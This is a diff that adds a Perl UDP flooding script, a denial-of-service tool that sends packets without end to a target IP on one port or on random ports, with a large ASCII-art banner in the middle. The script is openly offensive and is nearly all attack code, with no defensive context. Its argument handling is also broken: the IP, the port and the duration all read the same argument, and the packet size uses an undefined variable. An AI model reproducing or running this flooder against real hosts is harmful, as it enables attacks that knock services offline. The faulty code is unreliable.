@@ -1,0 +1,85 @@
+#!/usr/bin/perl
+use Socket;
+$ARGC=@ARGV;
+my ($ip,$port,$size,$time);
+$ip=$ARGV[0];
+$port=$ARGV[0];
+$time=$ARGV[0];
+socket(crazy, PF_INET, SOCK_DGRAM, 17);
+$iaddr = inet_aton("$ip");
+
+printf "[0;36m 
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMmyoosooyMMmo+yMMNdddddNMMMNhhhhhhhyhNMMMMMMMMMNdddmhhmMMMMMMMMMMMNhyyymMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMh::://::oMMd+/oMMd:::::yMMMN/::::::::hMMMMMMMm+:::::::sMMMMMMMMMMMm+:::dMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMd:::ymyydMdhhhhMMMd::/MMMMMMM+::hMdssmMMMMMMN/::odh+::ydssssymsssshM/::ooooyNMNyo++oyNNo+/osooyNMM
+MMMdo/::/yNMy/:::MMMd::+MMMMMMM+::::dMMMMMMMMMd:::mMMMNMMms:::ym+::+hM/::/so::/N/:/yo::+Mh/::/o/sNMM
+MMdysdmo::+MMm:::MMMd::+MNoodMM+::hmmsyhMMMMMMm/::yNMmhNMMMy::+s::oMMM+::sMM/::h:://:+smMM+::NMMMMMM
+MMy///o+//+Mdy///ymdo///s+//yMs///+o+//oMMMMMMMd////////mMMMh////sMMMM+///so//+Ms///+syNMy///shMMMMM
+MMdoohsoshNMdsssssddssssssssdNysssssssshMMMMMMMMNdysosymMMMMm+//yMMMMMhyyyoosdMMMNhssosMMyssssyMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh///hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdysdMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+                                                       ......-...`         
+                                                    `-:--:::-::--/--.      
+                                             `..`  --.:.`       `.--/-`    
+                              ``           .dNMMNms-::`            `+/+:.` 
+                    `-/oshdmmNNNNmmdhyo/:`:dMMMMMm/.:ds.           .-:.``  
+                ./odNNMMMMMMMMMMMMMMMMMMNmNy-dMMMmoohMMNs`                 
+             .+hNMMMMMMMMMMMMMMMMMMMMMMMNNo``sNNMMMMMMMMMh                 
+          `:yNMMMMMMMMMMmdyysssyhMMMMMNNN/ .hMMMNNNNMMMMMd                 
+         /dNMMMMMMMMNy+-``       mMMMMNm: :mMMMMMMMMNNNNh.                 
+       -hMMMMMMMMMd+.           `yMMMMMd.+NMMMMMMMMMMMMy`                  
+     `oNMMMMMMMMm+`        -/sdmmNMMMMMMmNNMMMMMMMMMMMNh.                  
+    `yMMMMMMMMMh.       `/hNMMMMMMMMMMMMMMMNNNNMMMMMNNMMm-                 
+   `hMMMMMMMMMy`       /dMMMMMMMMMMMMMMMMMMMMMNNNNNNNMMMMm:                
+   yMMMMMMMMMMh:`    .yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN-               
+  +MMMMMMMMMMMMNd+. -dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd`              
+ `NMMMMMMMMMMMMMMMmsmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM+              
+ +MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm              
+ hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM-             
+ mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM/             
+ NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM+             
+ dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:             
+ sMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.             
+ :MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMh              
+  hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN:              
+  .NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM+               
+   /NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMs                
+    /NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy`                
+     :mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNo                  
+      .yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd:                   
+        /dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNo`                    
+         `/dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmo.                      
+            :yNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNh/`                        
+              `:smMMMMMMMMMMMMMMMMMMMMMMMMMMNy/.                           
+                  ./ohmMMMMMMMMMMMMMMMMNhs/-                               
+                       `.:/+oooooo+/:-`                                    
+\n";
+
+
+if ($ARGV[1] ==0 && $ARGV[2] ==0) {
+goto randpackets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto packets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] ==0) {
+goto packets;
+}
+if ($ARGV[1] ==0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &"); 
+goto randpackets;
+}
+packets:
+for (;;) {
+$size=$rand x $rand x $rand;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
+randpackets:
+for (;;) {
+$size=$rand x $rand x $rand;
+$port=(rand 65000) +1;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
